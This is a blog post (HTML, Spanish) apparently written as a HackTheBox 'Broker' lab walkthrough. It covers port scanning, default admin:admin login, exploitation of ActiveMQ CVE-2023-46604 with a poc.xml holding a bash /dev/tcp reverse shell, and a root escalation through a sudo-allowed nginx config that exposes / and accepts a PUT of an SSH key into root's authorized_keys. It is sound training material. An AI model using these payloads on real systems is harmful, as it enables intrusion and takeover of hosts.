@@ -1,0 +1,523 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox - Broker (easy) | MiguelRega7 - blog</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="HackTheBox - Broker (easy)" />
+<meta name="author" content="MiguelRega7" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Posts sobre resolución de CTFs y ciberseguridad." />
+<meta property="og:description" content="Posts sobre resolución de CTFs y ciberseguridad." />
+<link rel="canonical" href="http://localhost:4000/hackthebox/machines/easy/2024/10/27/broker.html" />
+<meta property="og:url" content="http://localhost:4000/hackthebox/machines/easy/2024/10/27/broker.html" />
+<meta property="og:site_name" content="MiguelRega7 - blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-10-27T00:00:00-06:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="HackTheBox - Broker (easy)" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"MiguelRega7"},"dateModified":"2024-10-27T00:00:00-06:00","datePublished":"2024-10-27T00:00:00-06:00","description":"Posts sobre resolución de CTFs y ciberseguridad.","headline":"HackTheBox - Broker (easy)","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hackthebox/machines/easy/2024/10/27/broker.html"},"url":"http://localhost:4000/hackthebox/machines/easy/2024/10/27/broker.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="MiguelRega7 - blog" />
+</head>
+<body><header class="site-header">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">MiguelRega7 - blog</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">HackTheBox - Broker (easy)</h1>
+    <p class="post-meta"><time class="dt-published" datetime="2024-10-27T00:00:00-06:00" itemprop="datePublished">
+        Oct 27, 2024
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p align="center">
+<img src="https://labs.hackthebox.com/storage/avatars/a725533911ba94a880899fbf900d988c.png" />
+</p>
+
+<ul>
+  <li>Broker is an easy difficulty <code class="language-plaintext highlighter-rouge">Linux</code> machine hosting a version of <code class="language-plaintext highlighter-rouge">Apache ActiveMQ</code>. Enumerating the version of <code class="language-plaintext highlighter-rouge">Apache ActiveMQ</code> shows that it is vulnerable to <code class="language-plaintext highlighter-rouge">Unauthenticated Remote Code Execution</code>, which is leveraged to gain user access on the target. Post-exploitation enumeration reveals that the system has a <code class="language-plaintext highlighter-rouge">sudo</code> misconfiguration allowing the <code class="language-plaintext highlighter-rouge">activemq</code> user to execute <code class="language-plaintext highlighter-rouge">sudo /usr/sbin/nginx</code>, which is similar to the recent <code class="language-plaintext highlighter-rouge">Zimbra</code> disclosure and is leveraged to gain <code class="language-plaintext highlighter-rouge">root</code> access.</li>
+</ul>
+
+<h2 id="portscan">PortScan</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80,1883,5672,8161,37891,61613,61614,61616 10.10.11.243 <span class="nt">-oN</span> targeted
+Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-10-24 18:55 CST
+Nmap scan report <span class="k">for </span>10.10.11.243
+Host is up <span class="o">(</span>0.18s latency<span class="o">)</span><span class="nb">.</span>
+
+Bug <span class="k">in </span>mqtt-subscribe: no string output.
+PORT      STATE SERVICE    VERSION
+22/tcp    open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp    open  http       nginx 1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+| http-auth: 
+| HTTP/1.1 401 Unauthorized<span class="se">\x</span>0D
+|_  basic <span class="nv">realm</span><span class="o">=</span>ActiveMQRealm
+|_http-server-header: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Error 401 Unauthorized
+1883/tcp  open  mqtt
+5672/tcp  open  amqp?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GetRequest, HTTPOptions, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
+|     AMQP
+|     AMQP
+|     amqp:decode-error
+|_    7Connection from client using unsupported AMQP attempted
+|_amqp-info: ERROR: AQMP:handshake expected header <span class="o">(</span>1<span class="o">)</span> frame, but was 65
+8161/tcp  open  http       Jetty 9.4.39.v20210325
+|_http-title: Error 401 Unauthorized
+|_http-server-header: Jetty<span class="o">(</span>9.4.39.v20210325<span class="o">)</span>
+| http-auth: 
+| HTTP/1.1 401 Unauthorized<span class="se">\x</span>0D
+|_  basic <span class="nv">realm</span><span class="o">=</span>ActiveMQRealm
+37891/tcp open  tcpwrapped
+61613/tcp open  stomp      Apache ActiveMQ
+| fingerprint-strings: 
+|   HELP4STOMP: 
+|     ERROR
+|     content-type:text/plain
+|     message:Unknown STOMP action: HELP
+|     org.apache.activemq.transport.stomp.ProtocolException: Unknown STOMP action: HELP
+|     org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand<span class="o">(</span>ProtocolConverter.java:258<span class="o">)</span>
+|     org.apache.activemq.transport.stomp.StompTransportFilter.onCommand<span class="o">(</span>StompTransportFilter.java:85<span class="o">)</span>
+|     org.apache.activemq.transport.TransportSupport.doConsume<span class="o">(</span>TransportSupport.java:83<span class="o">)</span>
+|     org.apache.activemq.transport.tcp.TcpTransport.doRun<span class="o">(</span>TcpTransport.java:233<span class="o">)</span>
+|     org.apache.activemq.transport.tcp.TcpTransport.run<span class="o">(</span>TcpTransport.java:215<span class="o">)</span>
+|_    java.lang.Thread.run<span class="o">(</span>Thread.java:750<span class="o">)</span>
+61614/tcp open  http       Jetty 9.4.39.v20210325
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Jetty<span class="o">(</span>9.4.39.v20210325<span class="o">)</span>
+|_http-title: Site doesn<span class="s1">'t have a title.
+61616/tcp open  apachemq   ActiveMQ OpenWire transport
+| fingerprint-strings: 
+|   NULL: 
+|     ActiveMQ
+|     TcpNoDelayEnabled
+|     SizePrefixDisabled
+|     CacheSize
+|     ProviderName 
+|     ActiveMQ
+|     StackTraceEnabled
+|     PlatformDetails 
+|     Java
+|     CacheEnabled
+|     TightEncodingEnabled
+|     MaxFrameSize
+|     MaxInactivityDuration
+|     MaxInactivityDurationInitalDelay
+|     ProviderVersion 
+|_    5.15.15
+</span></code></pre></div></div>
+
+<h2 id="deserialization-attack-cve-2023-46604"> Deserialization Attack (CVE-2023-46604)</h2>
+
+<ul>
+  <li>
+    <p>Tenemos varios puertos abiertos los cuales corren el servicio <code class="language-plaintext highlighter-rouge">http</code> en la máquina vamos a enumerar primero el 80.</p>
+  </li>
+  <li>
+    <p>Nos pide credenciales.</p>
+  </li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/broker/1.png" />
+</p>
+
+<ul>
+  <li>Si probamos con <code class="language-plaintext highlighter-rouge">admin:admin</code> vemos que funcionan.</li>
+</ul>
+
+<p align="center"> 
+<img src="/assets/hackthebox/img/machines/easy/broker/2.png" />
+</p>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/broker/3.png" />
+</p>
+
+<ul>
+  <li>Aquí nos dan la versión.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/broker/4.png" />
+</p>
+
+<ul>
+  <li>
+    <p>Si investigamos encontramos una vulnerabilidad la cual nos otorga RCE <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-46604">https://nvd.nist.gov/vuln/detail/CVE-2023-46604</a>.</p>
+  </li>
+  <li>
+    <p>Aquí nos explican como funciona la vulnerabilidad <a href="https://github.com/evkl1d/CVE-2023-46604/tree/main">https://github.com/evkl1d/CVE-2023-46604/tree/main</a>.</p>
+  </li>
+  <li>
+    <p>Vamos a clonarlos el proyecto para poder enviar el <code class="language-plaintext highlighter-rouge">XML</code>.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ git clone https://github.com/evkl1d/CVE-2023-46604
+Cloning into <span class="s1">'CVE-2023-46604'</span>...
+remote: Enumerating objects: 22, <span class="k">done</span><span class="nb">.</span>
+remote: Counting objects: 100% <span class="o">(</span>22/22<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
+remote: Compressing objects: 100% <span class="o">(</span>17/17<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
+remote: Total 22 <span class="o">(</span>delta 5<span class="o">)</span>, reused 13 <span class="o">(</span>delta 3<span class="o">)</span>, pack-reused 0 <span class="o">(</span>from 0<span class="o">)</span>
+Receiving objects: 100% <span class="o">(</span>22/22<span class="o">)</span>, 5.10 KiB | 746.00 KiB/s, <span class="k">done</span><span class="nb">.</span>
+Resolving deltas: 100% <span class="o">(</span>5/5<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
+❯ <span class="nb">cd </span>CVE-2023-46604
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos a editar el <code class="language-plaintext highlighter-rouge">xml</code> que envié el exploit para obtener la reverse shell.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>poc.xml
+&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">"UTF-8"</span> ?&gt;
+    &lt;beans <span class="nv">xmlns</span><span class="o">=</span><span class="s2">"http://www.springframework.org/schema/beans"</span>
+       xmlns:xsi<span class="o">=</span><span class="s2">"http://www.w3.org/2001/XMLSchema-instance"</span>
+       xsi:schemaLocation<span class="o">=</span><span class="s2">"
+     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"</span><span class="o">&gt;</span>
+        &lt;bean <span class="nb">id</span><span class="o">=</span><span class="s2">"pb"</span> <span class="nv">class</span><span class="o">=</span><span class="s2">"java.lang.ProcessBuilder"</span> init-method<span class="o">=</span><span class="s2">"start"</span><span class="o">&gt;</span>
+            &lt;constructor-arg&gt;
+            &lt;list&gt;
+                &lt;value&gt;bash&lt;/value&gt;
+                &lt;value&gt;-c&lt;/value&gt;
+                &lt;value&gt;bash <span class="nt">-i</span> &amp;gt<span class="p">;</span>&amp;amp<span class="p">;</span> /dev/tcp/10.10.14.3/443 0&amp;gt<span class="p">;</span>&amp;amp<span class="p">;</span>1&lt;/value&gt;
+            &lt;/list&gt;
+            &lt;/constructor-arg&gt;
+        &lt;/bean&gt;
+    &lt;/beans&gt;
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>El script de Python3 nos automatiza el envió del <code class="language-plaintext highlighter-rouge">xml</code> en <code class="language-plaintext highlighter-rouge">ActiveMQ</code> que usa un entorno Spring y explota una vulnerabilidad de deserialización.</p>
+  </li>
+  <li>
+    <p>Vamos a ponernos en escucha.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+</code></pre></div></div>
+
+<ul>
+  <li>Iniciamos nuestro servidor en Python3.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">sudo </span>python3 <span class="nt">-m</span> http.server 80
+Serving HTTP on 0.0.0.0 port 8080 <span class="o">(</span>http://0.0.0.0:8080/<span class="o">)</span> ...
+</code></pre></div></div>
+
+<ul>
+  <li>Ejecutamos el script.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 exploit.py <span class="nt">-i</span> 10.10.11.243 <span class="nt">-u</span> http://10.10.14.3/poc.xml
+     _        _   _           __  __  ___        ____   ____ _____ 
+    / <span class="se">\ </span>  ___| |_<span class="o">(</span>_<span class="o">)</span>_   _____|  <span class="se">\/</span>  |/ _ <span class="se">\ </span>     |  _ <span class="se">\ </span>/ ___| ____|
+   / _ <span class="se">\ </span>/ __| __| <span class="se">\ \ </span>/ / _ <span class="se">\ </span>|<span class="se">\/</span>| | | | |_____| |_<span class="o">)</span> | |   |  _|  
+  / ___ <span class="se">\ </span><span class="o">(</span>__| |_| |<span class="se">\ </span>V /  __/ |  | | |_| |_____|  _ &lt;| |___| |___ 
+ /_/   <span class="se">\_\_</span>__|<span class="se">\_</span>_|_| <span class="se">\_</span>/ <span class="se">\_</span>__|_|  |_|<span class="se">\_</span>_<span class="se">\_\ </span>    |_| <span class="se">\_\\</span>____|_____|
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Target: 10.10.11.243:61616
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> XML URL: http://10.10.14.3/poc.xml
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sending packet: 0000006c1f000000000000000000010100426f72672e737072696e676672616d65776f726b2e636f6e746578742e737570706f72742e436c61737350617468586d6c4170706c69636174696f6e436f6e74657874010019687474703a2f2f31302e31302e31342e332f706f632e786d6c
+</code></pre></div></div>
+
+<ul>
+  <li>Llegan las peticiones.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">sudo </span>python3 <span class="nt">-m</span> http.server 80
+Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
+10.10.11.243 - - <span class="o">[</span>27/Oct/2024 11:40:55] <span class="s2">"GET /poc.xml HTTP/1.1"</span> 200 -
+10.10.11.243 - - <span class="o">[</span>27/Oct/2024 11:40:56] <span class="s2">"GET /poc.xml HTTP/1.1"</span> 200 -
+</code></pre></div></div>
+
+<ul>
+  <li>Nos llega la shell.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>activemq@broker:/opt/apache-activemq-5.15.15/bin<span class="nv">$ </span>script /dev/null <span class="nt">-c</span> bash
+script /dev/null <span class="nt">-c</span> bash
+Script started, output log file is <span class="s1">'/dev/null'</span><span class="nb">.</span>
+activemq@broker:/opt/apache-activemq-5.15.15/bin<span class="nv">$ </span>^Z
+zsh: suspended  nc <span class="nt">-nlvp</span> 443
+                                                                                                
+❯ <span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span><span class="nb">fg</span>
+<span class="o">[</span>1]  + continued  nc <span class="nt">-nlvp</span> 443
+                              reset xterm
+&lt;ENTER&gt;
+activemq@broker:/opt/apache-activemq-5.15.15/bin<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
+</code></pre></div></div>
+
+<h2 id="user-flag">User flag</h2>
+
+<ul>
+  <li>Vemos la flag.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>activemq@broker:~<span class="nv">$ </span><span class="nb">cat </span>user.txt 
+54339dbd39d73ad7935a3666c77837c1
+activemq@broker:~<span class="nv">$ </span>
+</code></pre></div></div>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+
+<ul>
+  <li>
+    <p>Podemos ejecutar como <code class="language-plaintext highlighter-rouge">root</code>  <code class="language-plaintext highlighter-rouge">nginx</code> sin proporcionar contraseña <a href="https://kinsta.com/es/base-de-conocimiento/que-es-nginx/">https://kinsta.com/es/base-de-conocimiento/que-es-nginx/</a>.</p>
+  </li>
+  <li>
+    <p>Vemos que podemos proporcionar un archivo de configuración para correr una web.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>activemq@broker:~<span class="nv">$ </span><span class="nb">sudo </span>nginx <span class="nt">-h</span>
+nginx version: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+Usage: nginx <span class="o">[</span>-?hvVtTq] <span class="o">[</span><span class="nt">-s</span> signal] <span class="o">[</span><span class="nt">-c</span> filename] <span class="o">[</span><span class="nt">-p</span> prefix] <span class="o">[</span><span class="nt">-g</span> directives]
+
+Options:
+  -?,-h         : this <span class="nb">help</span>
+  <span class="nt">-v</span>            : show version and <span class="nb">exit</span>
+  <span class="nt">-V</span>            : show version and configure options <span class="k">then </span><span class="nb">exit</span>
+  <span class="nt">-t</span>            : <span class="nb">test </span>configuration and <span class="nb">exit</span>
+  <span class="nt">-T</span>            : <span class="nb">test </span>configuration, dump it and <span class="nb">exit</span>
+  <span class="nt">-q</span>            : suppress non-error messages during configuration testing
+  <span class="nt">-s</span> signal     : send signal to a master process: stop, quit, reopen, reload
+  <span class="nt">-p</span> prefix     : <span class="nb">set </span>prefix path <span class="o">(</span>default: /usr/share/nginx/<span class="o">)</span>
+  <span class="nt">-c</span> filename   : <span class="nb">set </span>configuration file <span class="o">(</span>default: /etc/nginx/nginx.conf<span class="o">)</span>
+  <span class="nt">-g</span> directives : <span class="nb">set </span>global directives out of configuration file
+
+activemq@broker:~<span class="nv">$ </span>
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos a crear el <code class="language-plaintext highlighter-rouge">.conf</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>activemq@broker:/tmp<span class="nv">$ </span><span class="nb">cp</span> /etc/nginx/nginx.conf /tmp
+activemq@broker:/tmp<span class="nv">$ </span><span class="nb">cd</span> /tmp
+</code></pre></div></div>
+
+<ul>
+  <li>Editamos el <code class="language-plaintext highlighter-rouge">.conf</code> para poder tener privilegios de <code class="language-plaintext highlighter-rouge">directory listing</code> y crear el servicio para poder ver todo desde el directorio <code class="language-plaintext highlighter-rouge">/</code> de <code class="language-plaintext highlighter-rouge">root</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>activemq@broker:/tmp<span class="nv">$ </span><span class="nb">cat </span>nginx.conf 
+user root<span class="p">;</span>
+
+events <span class="o">{</span>
+	worker_connections 768<span class="p">;</span>
+	<span class="c"># multi_accept on;</span>
+<span class="o">}</span>
+
+http <span class="o">{</span>
+	server <span class="o">{</span>
+		listen     1234<span class="p">;</span>
+		root /<span class="p">;</span>
+		autoindex on<span class="p">;</span>
+	<span class="o">}</span>
+<span class="o">}</span>
+activemq@broker:/tmp<span class="nv">$ </span>
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora lo ejecutamos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>activemq@broker:/tmp<span class="nv">$ </span><span class="nb">sudo </span>nginx <span class="nt">-c</span> /tmp/nginx.conf 
+</code></pre></div></div>
+
+<ul>
+  <li>Lo vemos.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/broker/5.png" />
+</p>
+
+<ul>
+  <li>Ya podemos ver la flag de root.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/broker/6.png" />
+</p>
+
+<ul>
+  <li>Algo que podemos hacer para conectarnos por <code class="language-plaintext highlighter-rouge">ssh</code> podemos poner el método <code class="language-plaintext highlighter-rouge">PUT</code> para subir la <code class="language-plaintext highlighter-rouge">id_rsa</code> ya que el usuario <code class="language-plaintext highlighter-rouge">root</code> cuenta con el directorio .<code class="language-plaintext highlighter-rouge">ssh</code> solamente tenemos que cambiar el puerto.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>activemq@broker:/tmp<span class="nv">$ </span><span class="nb">cat </span>nginx.conf 
+user root<span class="p">;</span>
+
+events <span class="o">{</span>
+	worker_connections 768<span class="p">;</span>
+	<span class="c"># multi_accept on;</span>
+<span class="o">}</span>
+
+http <span class="o">{</span>
+	server <span class="o">{</span>
+		listen     1237<span class="p">;</span>
+		root /<span class="p">;</span>
+		autoindex on<span class="p">;</span>
+		dav_methods PUT<span class="p">;</span>
+	<span class="o">}</span>
+<span class="o">}</span>
+activemq@broker:/tmp<span class="nv">$ </span><span class="nb">sudo </span>nginx <span class="nt">-c</span> /tmp/nginx.conf
+activemq@broker:/tmp<span class="nv">$ </span>
+</code></pre></div></div>
+
+<ul>
+  <li>Creamos las claves.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ssh-keygen
+Generating public/private ed25519 key pair.
+Enter file <span class="k">in </span>which to save the key <span class="o">(</span>/home/miguelrega7/.ssh/id_ed25519<span class="o">)</span>: 
+/home/miguelrega7/.ssh/id_ed25519 already exists.
+Overwrite <span class="o">(</span>y/n<span class="o">)</span>? 
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora la subimos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>activemq@broker:/tmp<span class="nv">$ </span>curl <span class="nt">-s</span> <span class="nt">-X</span> PUT http://10.10.11.243:1237/root/.ssh/authorized_keys <span class="nt">-d</span> <span class="s1">'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPVJvICHwt32MJceMIYuxo4dMlOYxtQsUOAmQl2mMqhj miguelrega7@miguelito'</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora nos podemos conectar con <code class="language-plaintext highlighter-rouge">SSH</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ssh root@10.10.11.243
+Welcome to Ubuntu 22.04.3 LTS <span class="o">(</span>GNU/Linux 5.15.0-88-generic x86_64<span class="o">)</span>
+
+ <span class="k">*</span> Documentation:  https://help.ubuntu.com
+ <span class="k">*</span> Management:     https://landscape.canonical.com
+ <span class="k">*</span> Support:        https://ubuntu.com/advantage
+
+  System information as of Sun Oct 27 06:36:46 PM UTC 2024
+
+  System load:           0.0
+  Usage of /:            70.8% of 4.63GB
+  Memory usage:          10%
+  Swap usage:            0%
+  Processes:             161
+  Users logged <span class="k">in</span>:       0
+  IPv4 address <span class="k">for </span>eth0: 10.10.11.243
+  IPv6 address <span class="k">for </span>eth0: dead:beef::250:56ff:fe94:afc9
+
+ <span class="k">*</span> Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
+   just raised the bar <span class="k">for </span>easy, resilient and secure K8s cluster deployment.
+
+   https://ubuntu.com/engage/secure-kubernetes-at-the-edge
+
+Expanded Security Maintenance <span class="k">for </span>Applications is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: <span class="nb">sudo </span>pro status
+
+
+The list of available updates is more than a week old.
+To check <span class="k">for </span>new updates run: <span class="nb">sudo </span>apt update
+
+root@broker:~# <span class="nb">whoami
+</span>root
+root@broker:~# 
+</code></pre></div></div>
+
+  </div><a class="u-url" href="/hackthebox/machines/easy/2024/10/27/broker.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col">
+        <p class="feed-subscribe">
+          <a href="http://localhost:4000/feed.xml">
+            <svg class="svg-icon orange">
+              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
+            </svg><span>Subscribe</span>
+          </a>
+        </p>
+        <ul class="contact-list">
+          <li class="p-name">MiguelRega7</li>
+          
+        </ul>
+      </div>
+      <div class="footer-col">
+        <p>Posts sobre resolución de CTFs y ciberseguridad.
+</p>
+      </div>
+    </div>
+
+    <div class="social-links"><ul class="social-media-list"><li>
+  <a rel="me" href="https://github.com/MikeRega7" target="_blank" title="github">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#github"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://www.instagram.com/_miguelitornuno7" target="_blank" title="instagram">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#instagram"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278" target="_blank" title="linkedin">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#linkedin"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://twitter.com/MiguelJmrn7" target="_blank" title="twitter">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#twitter"></use>
+    </svg>
+  </a>
+</li>
+</ul>
+</div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
